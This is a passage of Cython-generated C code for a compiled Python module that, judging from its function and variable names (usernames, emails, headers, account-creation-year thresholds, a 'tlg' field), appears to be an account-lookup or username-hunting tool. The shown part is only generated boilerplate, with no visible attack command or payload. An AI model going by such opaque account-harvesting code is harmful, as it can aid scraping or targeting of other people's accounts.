  __pyx_tuple__116 = PyTuple_Pack(5, __pyx_n_s_user, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_r); if (unlikely(!__pyx_tuple__116)) __PYX_ERR(0, 582, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__116);
  __Pyx_GIVEREF(__pyx_tuple__116);
  __pyx_codeobj__117 = (PyObject*)__Pyx_PyCode_New(1, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__116, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_rest, 582, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__117)) __PYX_ERR(0, 582, __pyx_L1_error)

  
  __pyx_tuple__118 = PyTuple_Pack(4, __pyx_n_s_hy, __pyx_n_s_ranges, __pyx_n_s_upper, __pyx_n_s_year); if (unlikely(!__pyx_tuple__118)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__118);
  __Pyx_GIVEREF(__pyx_tuple__118);
  __pyx_codeobj__119 = (PyObject*)__Pyx_PyCode_New(1, 0, 4, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__118, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_date, 620, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__119)) __PYX_ERR(0, 620, __pyx_L1_error)

  
  __pyx_tuple__120 = PyTuple_Pack(13, __pyx_n_s_username, __pyx_n_s_gg, __pyx_n_s_headers, __pyx_n_s_rrr, __pyx_n_s_e, __pyx_n_s_Id, __pyx_n_s_fows, __pyx_n_s_fowg, __pyx_n_s_pp, __pyx_n_s_hy, __pyx_n_s_datte, __pyx_n_s_tlg, __pyx_n_s_ff); if (unlikely(!__pyx_tuple__120)) __PYX_ERR(0, 644, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__120);
  __Pyx_GIVEREF(__pyx_tuple__120);
  __pyx_codeobj__121 = (PyObject*)__Pyx_PyCode_New(2, 0, 13, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__120, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_InfoAcc, 644, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__121)) __PYX_ERR(0, 644, __pyx_L1_error)

  
  __pyx_tuple__122 = PyTuple_Pack(5, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_username, __pyx_n_s_emails, __pyx_n_s_email); if (unlikely(!__pyx_tuple__122)) __PYX_ERR(0, 709, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__122);
  __Pyx_GIVEREF(__pyx_tuple__122);
  __pyx_codeobj__123 = (PyObject*)__Pyx_PyCode_New(0, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__122, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_eizon, 709, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__123)) __PYX_ERR(0, 709, __pyx_L1_error)

  
  __pyx_codeobj__124 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_pppp, 744, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__124)) __PYX_ERR(0, 744, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_float_0_1 = PyFloat_FromDouble(0.1); if (unlikely(!__pyx_float_0_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_float_0_00110 = PyFloat_FromDouble(0.00110); if (unlikely(!__pyx_float_0_00110)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_4 = PyInt_FromLong(4); if (unlikely(!__pyx_int_4)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_15 = PyInt_FromLong(15); if (unlikely(!__pyx_int_15)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_16 = PyInt_FromLong(16); if (unlikely(!__pyx_int_16)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_200 = PyInt_FromLong(200); if (unlikely(!__pyx_int_200)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_300 = PyInt_FromLong(300); if (unlikely(!__pyx_int_300)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2010 = PyInt_FromLong(2010); if (unlikely(!__pyx_int_2010)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2011 = PyInt_FromLong(2011); if (unlikely(!__pyx_int_2011)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2012 = PyInt_FromLong(2012); if (unlikely(!__pyx_int_2012)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2013 = PyInt_FromLong(2013); if (unlikely(!__pyx_int_2013)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2014 = PyInt_FromLong(2014); if (unlikely(!__pyx_int_2014)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2015 = PyInt_FromLong(2015); if (unlikely(!__pyx_int_2015)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2016 = PyInt_FromLong(2016); if (unlikely(!__pyx_int_2016)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2017 = PyInt_FromLong(2017); if (unlikely(!__pyx_int_2017)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2018 = PyInt_FromLong(2018); if (unlikely(!__pyx_int_2018)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2019 = PyInt_FromLong(2019); if (unlikely(!__pyx_int_2019)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2023 = PyInt_FromLong(2023); if (unlikely(!__pyx_int_2023)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2025 = PyInt_FromLong(2025); if (unlikely(!__pyx_int_2025)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1279000 = PyInt_FromLong(1279000L); if (unlikely(!__pyx_int_1279000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_17750000 = PyInt_FromLong(17750000L); if (unlikely(!__pyx_int_17750000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_279760000 = PyInt_FromLong(279760000L); if (unlikely(!__pyx_int_279760000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_900990000 = PyInt_FromLong(900990000L); if (unlikely(!__pyx_int_900990000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1629010000 = PyInt_FromLong(1629010000L); if (unlikely(!__pyx_int_1629010000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2500000000 = PyInt_FromString((char *)"2500000000", 0, 0); if (unlikely(!__pyx_int_2500000000)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_3713668786 = PyInt_FromString((char *)"3713668786", 0, 0); if (unlikely(!__pyx_int_3713668786)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_5699785217 = PyInt_FromString((char *)"5699785217", 0, 0); if (unlikely(!__pyx_int_5699785217)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_8597939245 = PyInt_FromString((char *)"8597939245", 0, 0); if (unlikely(!__pyx_int_8597939245)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_21254029834 = PyInt_FromString((char *)"21254029834", 0, 0); if (unlikely(!__pyx_int_21254029834)) __PYX_ERR(0, 4, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct__genexpr) < 0) __PYX_ERR(0, 404, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct__genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct__genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct__genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct__genexpr = &__pyx_type_6source___pyx_scope_struct__genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_1_genexpr) < 0) __PYX_ERR(0, 405, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_1_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_1_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_1_genexpr = &__pyx_type_6source___pyx_scope_struct_1_genexpr;
  if (PyType_Ready(&__pyx_type_6source___pyx_scope_struct_2_genexpr) < 0) __PYX_ERR(0, 406, __pyx_L1_error)
  #if PY_VERSION_HEX < 0x030800B1
  __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_print = 0;
  #endif
  if ((CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP) && likely(!__pyx_type_6source___pyx_scope_struct_2_genexpr.tp_dictoffset && __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro == PyObject_GenericGetAttr)) {
    __pyx_type_6source___pyx_scope_struct_2_genexpr.tp_getattro = __Pyx_PyObject_GenericGetAttrNoDict;
  }
  __pyx_ptype_6source___pyx_scope_struct_2_genexpr = &__pyx_type_6source___pyx_scope_struct_2_genexpr;
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  Py_ssize_t __pyx_t_13;
  Py_UCS4 __pyx_t_14;
  int __pyx_t_15;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  PyObject *__pyx_t_19 = NULL;
  long __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_string, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_Table);
  __Pyx_GIVEREF(__pyx_n_s_Table);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_Table);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_rich_table, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_Table); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Table, __pyx_t_1) < 0) __PYX_ERR(0, 7, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Console);
  __Pyx_GIVEREF(__pyx_n_s_Console);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Console);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_rich_console, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Console); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Console, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_choice);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_random, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_1) < 0) __PYX_ERR(0, 9, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_render);
  __Pyx_GIVEREF(__pyx_n_s_render);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_render);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_render); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_2) < 0) __PYX_ERR(0, 10, __pyx_L1_error)
